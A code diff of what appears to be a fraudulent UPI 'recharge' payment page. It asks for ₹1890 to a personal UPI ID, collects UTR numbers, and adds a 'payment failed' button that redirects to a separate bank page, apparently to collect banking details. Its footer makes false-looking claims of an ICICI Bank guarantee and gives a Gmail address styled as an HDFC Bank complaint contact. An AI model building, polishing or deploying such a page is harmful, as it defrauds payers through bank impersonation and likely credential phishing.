@@ -8,6 +8,9 @@
   <!-- Font and Icon Libraries -->
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+ 
+  <link rel="stylesheet" href="style.css">
+  
 </head>
 <body>
   
@@ -15,10 +18,10 @@
     </header>
     <div class="content">
       <div class="info">
-        <p><span>Amount:</span> <strong>₹1890</strong>  <button onclick="copyText('1890')">COPY</button></p> 
-        <p><span>VPA/UPI:</span> <strong>jaimatadi1234@indianbank</strong> <button onclick="copyText('jaimatadi1234@indianbank')">COPY</button> </p>
-        <p><span>Name:</span> <strong>Rishpal Singh</strong> </p> </div>
-      
+        <p><span>Amount:</span> <align="right"> <strong>₹1890</strong> <button onclick="copyText('1890')">COPY</button> </align> </p>
+        <p><span>VPA/UPI:</span> <align="right"> <strong>jaimatadi1234@indianbank</strong> <button onclick="copyText('jaimatadi1234@indianbank')">COPY</button> </align> </p>
+        <p2><span1>Name:</span1> <strong>Rishpal Singh</strong> </p2> </div>
+        
       <label class="section-title">↓ Select payment method and pay ↓</label> 
       <div class="payment-options"> <hr>
       <label><input type="radio" name="payment-method" value="gpay"> <img src="https://i.ibb.co.com/K9cN6NJ/IMG-3882.png" alt="IMG-3882"width="63px" height="30px" style="vertical-align:middle"> </label> <hr>
@@ -30,23 +33,36 @@
         <label><input type="radio" name="payment-method" value="upi"> <img src="https://i.ibb.co.com/XZyYVF0/IMG-3880.png" alt="IMG-3880" width="84px" height="30px" style="vertical-align:middle"> </label> <hr> </hr>
         </div>
       <p class="utr-instruction">↓ Fill the UTR numbers after you done payment ↓</p>
-      <input type="text" id="utr" placeholder="Input UTR number">
+   UTR<input type="text" id="utr" placeholder="Input UTR number">
 
       <button class="submit-btn" onclick="submitUTR()">Submit UTR</button>
-      <button class="error-btn" onclick="openBankPage"</button> 
-      <br> </br> 
+      <button class="error-btn" onclick="window.location.href='bank.html'">Payment failed! Please try using a bank account</button></button> 
       </div>
+      
+      <div class="van-row van-row--justify-center"style="margin-top: 42px;">
+              <div class="1-image" style="width: 5px; height: 0px; overflow: hidden; border-radius: 8px;">
+                <img src="https://i.ibb.co.com/K9cN6NJ/IMG-3882.png" alt="IMG-3882"class="van-image__img">
+              </div>
+              <div class="1-image" style="width: 30px; height: 30px; overflow: hidden; border-radius: 8px;">
+                <img src="https://i.ibb.co.com/dtpd8d8/IMG-3881.png" alt="IMG-3881"class="van-image__img">
+              </div>
+              <div class="1-image" style="width: 30px; height: 30px; overflow: hidden; border-radius: 8px;">
+                <img src="https://i.ibb.co.com/1YgNg3b/IMG-3888.png" alt="IMG-3888"class="van-image__img">
+                <!---->
+                <!---->
+              <div class="1-image" style="width: 60px; height: 30px; overflow:hidden; border-radius: 8px;">
+                <img src="https://i.ibb.co.com/XZyYVF0/IMG-3880.png" alt="IMG-3880" class="van-image__img">
+      
+    <div>
       <center>
         <h6 style="color: lightgray; font-size: 8px;">Dear customers: please give priority to this channel to recharge! Support UPI account withdrawal! ICICI Bank guarantee! Safe and reliable! If you have any questions, please contact:</h6> </center>
 <center> <h6 style= "color:blue;font-size:7px;"> hdfcbankcomplaintacceptance@gmail.com </center>
         </h6>
           </div>
-  </div>
   <!-- Notification Popup -->
-  <div id="notification" class="notification"> </div>
-
-<script src="https://cdn.jsdelivr.net/npm/semver@7.6.3/index.js"> </script>
- <script src="https://cdn.jsdelivr.net/npm/semver@7.6.3/preload.js"> </script>
+  <div id="notification" class="notification"></div>
+  
 <script src="script.js"> </script>
+
 </body>
 </html>
